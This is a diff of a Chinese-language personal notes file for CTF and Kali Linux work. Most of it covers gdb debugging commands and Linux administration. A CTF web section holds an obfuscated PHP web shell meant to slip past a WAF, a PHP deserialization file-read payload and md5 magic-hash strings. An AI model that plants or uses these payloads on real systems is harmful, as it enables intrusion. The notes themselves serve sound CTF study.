@@ -25,16 +25,16 @@ sudo ln -s `pwd`/SageMath/sage /usr/local/bin/sage
 
     cd ~/Downloads/pwndbg
     ./setup.sh
-
+    
     pwndbg在调试堆的数据结构时候很方便
-
+    
     peda在查找字符串等功能时方便
-
+    
     安装peda：
-
+    
     git clone https://github.com/longld/peda.git ~/peda
     安装gef：
-
+    
     # via the install script
     $ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh
      
@@ -42,13 +42,13 @@ sudo ln -s `pwd`/SageMath/sage /usr/local/bin/sage
     $ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py
     $ echo source ~/.gdbinit-gef.py >> ~/.gdbinit
     切换gdb的调试工具pwndbg或peda：
-
+    
     vim ~/.gdbinit
     source ~/peda/peda.py
     把第二行添加到gdbinit的配置文件中去，把pwndbg的注释掉，即可切换为peda
-
+    
     选中gef的话，即添加一行：
-
+    
     source ~/.gdbinit-gef.py
     并把其他两行注释掉即可
 
@@ -82,7 +82,7 @@ https://www.jianshu.com/p/ddf9376334cd
 
     # install dependencies
     sudo apt-get install -y cmake build-essential libboost-dev libqt5xmlpatterns5-dev qtbase5-dev qt5-default libqt5svg5-dev libgraphviz-dev libcapstone-dev pkg-config
-
+    
     # build and run edb
     git clone --recursive https://github.com/eteran/edb-debugger.git
     cd edb-debugger
@@ -280,11 +280,11 @@ ss -tnl
 netstat -pantu
 
 find
-  
+
     find / -iname xxxx.jpg
 
 grep
- 
+
     grep  "flag" -r -a * 
 
 strings xiaojiejie.jpeg | grep -E "\{[a-z]{4,}"
@@ -300,8 +300,15 @@ who 查看谁连接了服务器
   pts 为远程终端
   pkill -kill -t pts/0 # /后面0是终端号
 
+环境变量
+    env 
+    set
+    export
+
 #### apt
 搜索包 apt-cache pkgnames | grep php7.1
+#### 搜索包
+dpkg -S filename
 ##### 安装 php
 https://kejyuntw.gitbooks.io/ubuntu-learning-notes/content/web/php/web-php-php-7.1-install.html
 
@@ -331,19 +338,19 @@ du -sk filename 查看指定文件大小
 df -h 查看系统中文件的使用情况
 
     df参数：
-
+    
     -a：列出所有的文件系统，包括系统特有的/proc等文件系统
-
+    
     -k：以KB的容量显示各文件系统
-
+    
     -m：以MB的容量显示各文件系统
-
+    
     -h：以人们较易阅读的GB,MB,KB等格式自行显示
-
+    
     -H：以M=1000K替代M=1024K的进位方式
-
+    
     -T：连同该分区的文件系统名称（例如ext3）也列出
-
+    
     -i：不用硬盘容量，而以inode的数量来显示
 
 nmap
@@ -390,7 +397,7 @@ awk 分割 拆分
     cat test.csv | awk -F "," '{print $2,$3}'
     也可以用BEGIN块+FS来处理，OFS表示输出的分隔符
     cat test.csv | awk 'BEGIN{FS=",";OFS=";" }{ print $2,$3}'
-
+    
     NR:表示当前记录数
     FNR:也表示当前记录数，但是FNR的作用域只在一个文件内.如果重新打开文件,FNR会从1开始.
     
@@ -404,13 +411,13 @@ awk 分割 拆分
         2 222 xlx
         3 333 ww
         4 444 yyy
-
+    
         $ cat file2
         cid status
         111 a
         222 b
         333 c
-
+    
         $ cat file3
         st cid name status
         1 111 wy a
@@ -528,7 +535,7 @@ dd if=logo.jpg of=2-1.jpg skip=$((0x7011)) bs=1
 ### 启动服务 mysql
 
 1
-  
+
     systemctl start mysql
 
 2
@@ -546,7 +553,7 @@ ctf
 ## Web
 
 ### 基本知识
-  
+
   Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，
   告诉服务器我是从哪个页面链接过来的
 ### php
@@ -560,10 +567,10 @@ ctf
       index.php?line=&filename=a2V5cy50eHQ= ， 这里 line=数字 加 filename=[base64filename] 可以读取源码行
       尝试获取 index.php hint.php flag.php key.php
       ?txt=data://text/plain,welcome to the bugkuctf&file=hint.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
-
+    
     语句
       ?s=print_r(scandir('./')) , 显示当前目录文件
-
+    
     过狗
       <?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?>
 
@@ -596,7 +603,7 @@ strcmp漏洞
 
 
 php中的 md5 碰撞
-  
+
     因为0e开头的关系，认为值是相同的。md5加密后为0e开头即可。以都均可
     s878926199a,  s1885207154a,  s1836677006a,  s155964671a
 
@@ -646,7 +653,7 @@ mimikatz.exe 读取dmp文件。 16进制 MD MP 开头
 
     pwgen
     xeger 
- 
+
 ### 暴力破解
 
   `wifi
@@ -787,40 +794,92 @@ sudo make install
     
     set *0x4007e48=0x7c6c  # 修改值
 
-### 常用命令
+### gdb调试常用命令
 ```
-Enter 直接回车 表示重复上一条命令:
-
+file gdb-sample # 载入程序
+Enter 重复上一条命令
 start 启动程序停在开辟完主函数栈帧的地方
-
+r    # run
+p n  # print n
+c    # Continue
+display /i $pc # 显示汇编指令
+ni/si // step next/over 同sn针对汇编代码
+s/n // 针对C代码
+n 5 //走5步
+fin // 执行到返回
+q   // 退出
 at // attach
 
-q 退出
-
-
-b *0x400100 (b main):在 0x400100 处下断点, d [number]：删除断点, d * 删除全部
-
-    b printf
-    b system
+```
+* breakpoints 
+```
+b *main # 在 main 函数的 prolog 代码处设置断点（prolog、epilog，分别表示编译器在每个函数的开头和结尾自行插入的代码）
+b *0x400100 # 在 0x400100处断点
 b *$rebase(0x相对基址偏移)  # pwndbg带的
+d  # Delete breakpoint）
+d * // 删除全部
+dis(able) # // 禁用端点
+```
 
-r(run)  // 运行程序
-
-
-使用si/ni 能确保是一步
-
-n  //ni：单步步过
-n 5 // 走5步
-s  //si：单步步入
-s/n // 针对提源代码
-si,ni // 同sn, 针对是汇编代码
-
-fin // 执行到返回
-
+*info 
+```
+i r”命令显示寄存器中的当前值———“i r”即“Infomation Register”：
 i r // info register
-info b(reak) // 查看当前断点信息
+i r eax
+i b # 查看断点
+i functions 
 info file  // 查看当前文件的信息，例如程序入口点
+info symbol 0x4555088 # 显示这是哪个函数
+```
 
+```
+list <linenum>
+• list <function>
+• list 显示当前行后面的源码
+• list -显示当前行前面的源码
+ search <regexp>
+• forward-search 向前搜索
+• reverse-search 全部搜索
+
+```
+* 运行参数
+```
+1、set args 10 20 30
+• 2、run 10 20 30
+• 3、gdb test -args 10 20 30
+• show args
+• 运行时输入数据：
+• run < payload.txt
+
+watch <expr>
+– 一旦表达式（变量）值有所变化，程序立马停住
+rwatch <expr>
+– 当expr被读时
+• awatch <expr>
+– 当expr被读或写时
+• info watchpoints
+• 清除停止点（break、watch、catch）
+– delete、clear、disable、enable
+```
+* 修改变量值
+```
+print x=4
+set x=4
+set var width=10
+set *(char*)0x08048e3a = 0x74 修改汇编值
+set $rsp=$rsp+1 # rsp+1
+```
+* 跳转执行
+```
+jump
+jump <linespec>
+jump <address>
+同样，也可以直接改变跳转执行的地址：
+set $pc=0x08041234
+```
+* x命令
+```
+x/32gx 0x602010-0x10 命令查看堆块情况
 x/i 0x601060 // 查看汇编 1行
 x/20i 0x601060 // 查看汇编 20行
 
@@ -828,30 +887,46 @@ x/16wx $esp // 查看栈情况
 
 x/5s $eax  // 看5个 s字符串
 x/5sw $eax // 看5个 s字符串 w--dword 双字
-x/200w $eax // 看eax的 200个4字节
+x/5w $eax // 看eax的 5个4字节
+x/5gx $rsp-8 //5个8字节 可计算
 
 x/3uh 0x54320 //内存地址0x54320读取内容 3u 3w个字节
 x/3us 0x601080 //读取地址字符串
-
-已进入函数了 -8对齐
-x/64gx $rsp-8
-
-p 打印出函数地址/计算
-
-    p __free_hook // 打印 freehook地址信息
-    p shell // 打印 shell
-    p $esp - 1
-    p /x value 16进制输出
-
+```
+* p 打印出函数地址/计算
+```
+p __free_hook // 打印 freehook地址信息
+p shell // 打印 shell
+p $esp - 1
+p /x value 16进制输出
+```
 find 命令查找"/bin/sh" 字符串
 
-set *(char*)0x08048e3a = 0x74 修改汇编值
-set $rsp=$rsp+1 # rsp+1
+#### x/命令
+格式: x /nfu <addr>
 
+说明
+x 是 examine 的缩写
 
-info symbol 0x4555088 # 显示这是哪个函数
+n表示要显示的内存单元的个数
 
-```
+f表示显示方式, 可取如下值
+x 按十六进制格式显示变量。
+d 按十进制格式显示变量。
+u 按十进制格式显示无符号整型。
+o 按八进制格式显示变量。
+t 按二进制格式显示变量。
+a 按十六进制格式显示变量。
+i 指令地址格式
+c 按字符格式显示变量。
+f 按浮点数格式显示变量。
+
+u表示一个地址单元的长度
+b表示单字节，
+h表示双字节，
+w表示四字节，
+g表示八字节
+
 #### 调试PIE程序
 sudo vi v/proc/sys/kernel/randomize_va_space  本地调试修改为0 就不会随机变化地址了
 
@@ -964,70 +1039,7 @@ p &((struct link_map*)0)->l_info：查看l_info成员偏移
 ### gdb attach, process后 gdb script有问题时，选默认终端为qterminal。
 
     gcc gdb-sample.c -o gdb-sample -g
-    gdb
-    file gdb-sample # file 载入程序
-    b main # break at main
-    r  # run
-    s  # step into
-    ni # step next/over
-    (gdb) p n  # print n
-    c  # Continu
-    display /i $pc # 显示汇编指令
-    si  #”命令用于执行一条汇编代码——区别于“s”执行一行C代码）：
 
-    d  # Delete breakpoint）
-        
-        b *main # 在 main 函数的 prolog 代码处设置断点（prolog、epilog，分别表示编译器在每个函数的开头和结尾自行插入的代码）
-
-    i r”命令显示寄存器中的当前值———“i r”即“Infomation Register”：
-    i r eax
-    i b # 查看断点
-    q  #Quit
-
-    list <linenum>
-    • list <function>
-    • list 显示当前行后面的源码
-    • list -显示当前行前面的源码
-     search <regexp>
-    • forward-search 向前搜索
-    • reverse-search 全部搜索
-
-
-运行参数
-
-    1、set args 10 20 30
-    • 2、run 10 20 30
-    • 3、gdb test -args 10 20 30
-    • show args
-    • 运行时输入数据：
-    • run < payload.txt
-
-    watch <expr>
-    – 一旦表达式（变量）值有所变化，程序立马停住
-    rwatch <expr>
-    – 当expr被读时
-    • awatch <expr>
-    – 当expr被读或写时
-    • info watchpoints
-    • 清除停止点（break、watch、catch）
-    – delete、clear、disable、enable
-
-修改变量值
-
-    (gdb)print x=4
-    • (gdb)set x=4
-    • (gdb)set var width=10
-
-跳转执行
-
-    • jump
-    • jump <linespec>
-    • jump <address>
-    • 同样，也可以直接改变跳转执行的地址：
-    • set $pc=0x08041234
-    •
-
-    x/32gx 0x602010-0x10 命令查看堆块情况
 ### pwngdb使用
 在gdb.attach(io)之后，先输入r运行程序。再继续其他操作
 ## proxychains
@@ -1063,7 +1075,7 @@ sudo vi /etc/proxychains.conf
     # 添加
     .host:/vmware /home/kali/vmware fuse.vmhgfs-fuse   allow_other   0   0
     # echo ".host:/vmware /home/kali/vmware fuse.vmhgfs-fuse   allow_other   0   0" | sudo tee -a /etc/fstab
-
+    
     # 检测配置工作正常
     mount -a 
 
@@ -1072,7 +1084,7 @@ sudo vi /etc/proxychains.conf
     sudo crontab -e
     # 加入
     @reboot /home/kali/x.sh
-
+    
     # x.sh
     sudo vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other
     sudo mount --bind /mnt/hgfs/vmware /home/kali/vmware
@@ -1096,10 +1108,10 @@ sudo vi /etc/init.d/mount
     :set ff=unix回车
     wq回车
     # ff -> file format
-
+    
     方法2
     cat dbback.sh | tr "\r\n" "\n"
-
+    
     方法3：
     sed -i 's/\r$//' file.sh
     将file.sh中的\r都替换为空白，问题解决
@@ -1135,7 +1147,7 @@ Then add the following content to it.
     [Unit]
      Description=/etc/rc.local Compatibility
      ConditionPathExists=/etc/rc.local
-
+    
     [Service]
      Type=forking
      ExecStart=/etc/rc.local start
@@ -1143,12 +1155,13 @@ Then add the following content to it.
      StandardOutput=tty
      RemainAfterExit=yes
      SysVStartPriority=99
-
+    
     [Install]
      WantedBy=multi-user.target
     Note: Starting with 16.10, Ubuntu doesn't ship with /etc/rc.local file anymore. Same thing for other distributions like Kali. You can create the file by executing this command.
 
-    
+
+​    
 `printf '%s\n' '#!/bin/bash' 'exit 0' | sudo tee -a /etc/rc.local`
 
 Then add execute permission to /etc/rc.local file.
@@ -1200,9 +1213,9 @@ sudo dpkg-reconfigure locales
     sudo apt-get -d -y install open-vm-tools
     sudo apt-get -d -y install open-vm-tools-desktop
     sudo apt-get -d -y install open-vm-tools-desktop fuse
-
+    
     文件夹共享 open-vm-tools-dkms
-
+    
     桌面拖放   open-vm-tools-desktop
 
 复制到U盘
@@ -1499,10 +1512,10 @@ Changing the Priority of a Running Process with renice
 Killing Processes
 
     linux-basics-hackers-networking-scripting.pdf  --- Table 6-1: Commonly Used Kill Signals
-
+    
     restart a process with the HUP signal, 
     kali >kill -1 6996
-
+    
     kill process
     kali >kill -9 6996
     kali >killall -9 zombieprocess
@@ -1531,7 +1544,7 @@ Scheduling Processes
     at now +5 days  Scheduled to run in five days from the current date
     at now+3 weeks  Scheduled to run in three weeks from the current date
     at 7:20pm 06/25/2019    Scheduled to run at 7:20 PM on June 25,2019
-
+    
     kali >at 7:20am
     at >/root/myscanningscript
 
@@ -1895,7 +1908,7 @@ except:
 https://www.kali.org/releases/
 https://images.kali.org/virtual-images/kali-linux-2021.2-vmware-amd64.7z
 
-# bash/terminal 终端快捷键操作
+# bash/terminal 终端快捷键操作 keyboard/hotkey
 https://www.gnu.org/software/emacs/refcards/pdf/refcard.pdf
 
 重复10次输入1      --     Alt+10, 1
